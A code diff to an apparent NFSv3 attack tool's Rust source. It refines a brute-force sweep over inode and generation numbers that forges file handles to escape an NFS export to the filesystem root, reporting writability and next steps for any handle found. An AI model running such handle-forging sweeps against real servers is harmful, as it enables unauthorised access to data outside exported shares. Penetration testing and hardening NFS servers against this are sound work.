@@ -117,8 +117,15 @@ pub(crate) async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::
     let gen_start = args.gen_start;
     let gen_end = args.gen_end;
 
-    let inode_count = inode_end.saturating_sub(inode_start) + 1;
-    let gen_count = u64::from(gen_end.saturating_sub(gen_start)) + 1;
+    if inode_end < inode_start {
+        bail!("--inode-end ({inode_end}) must be >= --inode-start ({inode_start})");
+    }
+    if gen_end < gen_start {
+        bail!("--gen-end ({gen_end}) must be >= --gen-start ({gen_start})");
+    }
+
+    let inode_count = inode_end - inode_start + 1;
+    let gen_count = u64::from(gen_end - gen_start) + 1;
     let search_space = inode_count.saturating_mul(gen_count);
 
     eprintln!("{}", crate::output::status_info(&format!(
@@ -209,51 +216,27 @@ async fn access_grants_write(client: &Nfs3Client, fh: &FileHandle) -> bool {
 async fn report_hit(client: &Nfs3Client, candidate: &EscapeResult, note: &str, host: &str) {
     let rw = writability_hint(client, &candidate.root_handle).await;
     let hex = candidate.root_handle.to_hex();
+    let label = if note.contains("root") || note.contains("Root") { "Root handle" } else { "Handle" };
     println!();
     println!("  Filesystem:  {:?}  (inode {}  {note})", candidate.fs_type, candidate.inode_number);
     println!("  Writability: {rw}");
-    crate::output::print_handle("Root handle", &hex);
+    crate::output::print_handle(label, &hex);
     crate::output::print_handle_next_steps(&hex, host);
     println!();
 }
 
-/// Full cross-product sweep: (inode_start..=inode_end) x (gen_start..=gen_end).
+/// Cross-product sweep: (inode_start..=inode_end) x (gen_start..=gen_end).
 ///
-/// Phase 1 tries fingerprint-driven known root candidates (parity with `escape`).
-/// Phase 2 sweeps the user-specified inode x generation space. All valid handles
-/// are reported, not just the first root.
+/// Every valid handle is reported. The first root directory is printed as the
+/// primary result with writability hint and next-steps; all other hits
+/// (directories, files, denied handles) are listed as additional discoveries.
 #[expect(clippy::too_many_arguments, reason = "sweep parameters are all caller-controlled range bounds")]
-async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_attempts: u64, inode_start: u64, inode_end: u64, gen_start: u32, gen_end: u32, host: &str) -> bool {
+async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, _fs: FsType, max_attempts: u64, inode_start: u64, inode_end: u64, gen_start: u32, gen_end: u32, host: &str) -> bool {
     let mut found_root = false;
     let mut extra_hits: Vec<(u64, u32, String)> = Vec::new();
-
-    // Phase 1: fingerprint-driven known root candidates (cheap, 3-5 probes).
-    let mut known: Vec<EscapeResult> = FileHandleAnalyzer::construct_escape_handle(seed).into_iter().collect();
-    if matches!(fs, FsType::Xfs | FsType::Unknown) {
-        known.extend(FileHandleAnalyzer::construct_xfs_escape_candidates(seed));
-    }
     let mut stale = 0u64;
     let mut tried = 0u64;
-    for cand in &known {
-        match probe(client, &cand.root_handle).await {
-            Probe::Dir => {
-                report_hit(client, cand, "known root, verified", host).await;
-                found_root = true;
-            },
-            Probe::Denied => {
-                report_hit(client, cand, "known root, access denied (root_squash)", host).await;
-                found_root = true;
-            },
-            Probe::NonDir => extra_hits.push((u64::from(cand.inode_number), 0, cand.root_handle.to_hex())),
-            Probe::Stale => stale += 1,
-            Probe::Miss => {},
-        }
-        if found_root {
-            break;
-        }
-    }
 
-    // Phase 2: cross-product sweep over inode x generation.
     'outer: for inode in inode_start..=inode_end {
         if tried >= max_attempts {
             break;
@@ -272,7 +255,7 @@ async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_at
                     if found_root {
                         extra_hits.push((inode, generation, cand.root_handle.to_hex()));
                     } else {
-                        report_hit(client, &cand, &format!("inode {inode} gen {generation}"), host).await;
+                        report_hit(client, &cand, &format!("root directory, inode {inode} gen {generation}"), host).await;
                         found_root = true;
                     }
                 },
@@ -280,7 +263,7 @@ async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_at
                     if found_root {
                         extra_hits.push((inode, generation, cand.root_handle.to_hex()));
                     } else {
-                        report_hit(client, &cand, &format!("inode {inode} gen {generation} (ACCES)"), host).await;
+                        report_hit(client, &cand, &format!("inode {inode} gen {generation} (ACCES -- root_squash)"), host).await;
                         found_root = true;
                     }
                 },
